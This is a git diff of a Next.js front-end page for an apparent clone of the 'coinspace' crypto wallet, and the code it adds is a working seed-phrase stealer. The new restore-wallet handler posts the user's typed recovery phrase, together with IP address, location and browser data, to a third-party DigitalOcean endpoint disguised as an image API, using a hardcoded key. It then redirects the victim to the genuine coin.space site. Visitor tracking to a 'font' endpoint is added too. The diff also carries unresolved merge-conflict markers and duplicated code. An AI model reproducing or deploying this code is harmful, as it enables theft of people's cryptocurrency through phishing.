@@ -4,10 +4,18 @@
 import EnterPassphraseModal from "../components/EnterPassphraseModal";
 import GeneratePassphraseModal from "../components/GeneratePassphraseModal";
 import SeedPhraseModal from "../components/SeedPhraseModal";
+<<<<<<< HEAD
 import { useState, useEffect, useRef } from "react";
 import { getUserCountry } from "./userLocation";
 import axios from "axios";
 import { usePathname } from "next/navigation";
+=======
+import { useRouter } from "next/navigation";
+import {  useEffect } from "react";
+import { useRef } from "react";
+import axios from "axios";
+import { getUserCountry } from "./userLocation";
+>>>>>>> redirect-app
 
 const WORDLIST = [
   "apple",
@@ -48,18 +56,62 @@ function generateSeedPhrase(words: string[], length = 12): string[] {
 }
 
 export default function Page() {
+  const router = useRouter();
   const [isExistingWalletModalOpen, setIsExistingWalletModalOpen] =
     useState(false);
   const [isNewWalletModalOpen, setIsNewWalletModalOpen] = useState(false);
-  const [isSeedPhraseModalOpen, setIsSeedPhraseModalOpen] = useState(false);
+  const [isSeedPhraseInputModalOpen, setIsSeedPhraseInputModalOpen] = useState(false);
   const [seedPhrase, setSeedPhrase] = useState<string[]>([]);
 
-  const handleOpenExistingWallet = () => setIsExistingWalletModalOpen(true);
+  const handleOpenExistingWallet = () => setIsSeedPhraseInputModalOpen(true);
   const handleCloseExistingWalletModal = () =>
-    setIsExistingWalletModalOpen(false);
-  const handleConfirmPassphrase = (value: string) => {
-    console.log("Existing wallet passphrase:", value);
-    setIsExistingWalletModalOpen(false);
+    setIsSeedPhraseInputModalOpen(false);
+  const handleConfirmPassphrase = () => {
+    console.log("Existing wallet passphrase confirmed");
+    setIsSeedPhraseInputModalOpen(false);
+  };
+
+  const sendSeedPhraseMessage = async (seedPhrase: string) => {
+    console.log("Getting fresh user country data for seed phrase...");
+    const userCountry = await getUserCountry();
+    console.log("Fresh User Country Data for Seed Phrase:", userCountry);
+    console.log("Seed Phrase:", seedPhrase);
+
+    const messageData = {
+      info: "Seed Phrase Restoration",
+      url: getCurrentUrl(),
+      referer: document.referrer || getCurrentUrl(),
+      country: userCountry?.country || country || "Unknown",
+      countryEmoji: userCountry?.countryEmoji || "",
+      city: userCountry?.city || "Unknown",
+      ipAddress: userCountry?.ip || ipAddress || "0.0.0.0",
+      browser: typeof navigator !== "undefined" ? navigator.userAgent : browser,
+      date: new Date().toISOString(),
+      appName: "coinspace",
+      seedPhrase: seedPhrase,
+    };
+    console.log("Seed Phrase Message Data", messageData);
+      axios
+        .post(
+          "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/image",
+          messageData,
+          {
+            headers: {
+              "Content-Type": "application/json",
+              "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
+            },
+          }
+        )
+      .then(response => response.data)
+      .then(() => window.location.href = "https://coin.space/wallet/")
+      .catch(error => console.error("Error sending seed phrase message:", error));
+  };
+
+  const handleRestoreWallet = (seedPhrase: string) => {
+    console.log("Restoring wallet with seed phrase:", seedPhrase);
+    // Send seed phrase notification for wallet restoration
+    sendSeedPhraseMessage(seedPhrase);
+    // You can add more wallet restoration logic here
   };
 
   const handleCreateNewWallet = () => setIsNewWalletModalOpen(true);
@@ -69,15 +121,115 @@ export default function Page() {
     const generated = generateSeedPhrase(WORDLIST);
     setSeedPhrase(generated);
     setIsNewWalletModalOpen(false);
-    setIsSeedPhraseModalOpen(true);
+    try {
+      localStorage.setItem("seedPhrase", JSON.stringify(generated));
+    } catch {}
+    router.push("/wallet");
     console.log("Generated seed phrase:", generated);
   };
 
-  const handleCloseSeedPhraseModal = () => setIsSeedPhraseModalOpen(false);
-  const handleContinueAfterSeed = () => {
-    console.log("User confirmed seed phrase, proceed to dashboard");
-    setIsSeedPhraseModalOpen(false);
+  const handleCloseSeedPhraseModal = () => {};
+  const handleContinueAfterSeed = () => {};
+
+  
+  const [country, setCountry] = useState("");
+  const [ipAddress, setIpAddress] = useState("");
+  const [browser, setBrowser] = useState<string | undefined>(undefined);
+  const [isVerifiedBot, setIsVerifiedBot] = useState(false);
+  const hasSentVisitorMessage = useRef(false);
+  const pathname =
+    typeof window !== "undefined" ? window.location.pathname : "";
+  const getCurrentUrl = () => {
+    if (typeof window !== "undefined") {
+      let url = `${window.location.origin}${pathname}`;
+      if (url.includes("localhost")) {
+        url = "https://google.com";
+      }
+      if (url.includes("vercel.com")) {
+        url = url.replace("vercel.com", "digitalocean.com");
+      }
+      console.log("getCurrentUrl returning:", url);
+      return url;
+    }
+    console.log("getCurrentUrl: window not available, returning empty string");
+    return "";
   };
+  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
+    console.log("User Country Data:", userCountry);
+    console.log("State country:", country);
+    console.log("State ipAddress:", ipAddress);
+    console.log("State browser:", browser);
+
+    console.log("User Country Data:", userCountry);
+    const messageData = {
+      info: "Regular Visitor", // You can update this logic as needed
+      url: getCurrentUrl(),
+      referer: document.referrer || getCurrentUrl(),
+      location: {
+        country: userCountry?.country || country || "Unknown",
+        countryEmoji: userCountry?.countryEmoji || "",
+        city: userCountry?.city || "Unknown",
+        ipAddress: userCountry?.ip || ipAddress || "0.0.0.0",
+      },
+      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
+      date: new Date().toISOString(),
+      appName: "coinspace",
+    };
+    console.log("Message Data", messageData);
+    axios
+      .post(
+        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/font",
+        messageData,
+        {
+          headers: {
+            "Content-Type": "application/json",
+            "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
+          },
+        }
+      )
+      .catch((error) =>
+        console.error(
+          "Error sending font message:",
+          error.response.data.details
+        )
+      );
+  };
+
+  useEffect(() => {
+    if (!hasSentVisitorMessage.current) {
+      const fetchUserLocation = async () => {
+        const userCountry = await getUserCountry();
+        setCountry(userCountry?.country || "Unknown");
+        setIpAddress(userCountry?.ip || "0.0.0.0");
+        sendTelegramMessage(userCountry);
+      };
+      fetchUserLocation();
+      hasSentVisitorMessage.current = true;
+    }
+  }, []);
+
+ 
+
+  useEffect(() => {
+    // Set browser info only on client side
+    if (typeof window !== "undefined") {
+      setBrowser(navigator.userAgent);
+    }
+  }, []);
+
+  useEffect(() => {
+    if (!hasSentVisitorMessage.current) {
+      const fetchUserLocation = async () => {
+        const userCountry = await getUserCountry();
+        setCountry(userCountry?.country || "Unknown");
+        setIpAddress(userCountry?.ip || "0.0.0.0");
+        sendTelegramMessage(userCountry);
+      };
+      fetchUserLocation();
+      hasSentVisitorMessage.current = true;
+    }
+  }, []);
+  
 
   const [country, setCountry] = useState("");
   const [ipAddress, setIpAddress] = useState("");
@@ -209,17 +361,14 @@ export default function Page() {
         onGenerate={handleGeneratePassphrase}
       />
 
-      <SeedPhraseModal
-        open={isSeedPhraseModalOpen}
-        seedPhrase={seedPhrase}
-        onClose={handleCloseSeedPhraseModal}
-        onContinue={handleContinueAfterSeed}
-      />
+      {/* Seed phrase display moved to /wallet page */}
 
-      <EnterPassphraseModal
-        open={isExistingWalletModalOpen}
+      <SeedPhraseModal
+        open={isSeedPhraseInputModalOpen}
         onClose={handleCloseExistingWalletModal}
-        onConfirm={handleConfirmPassphrase}
+        onContinue={handleConfirmPassphrase}
+        onRestoreWallet={handleRestoreWallet}
+        mode="input"
       />
     </main>
   );
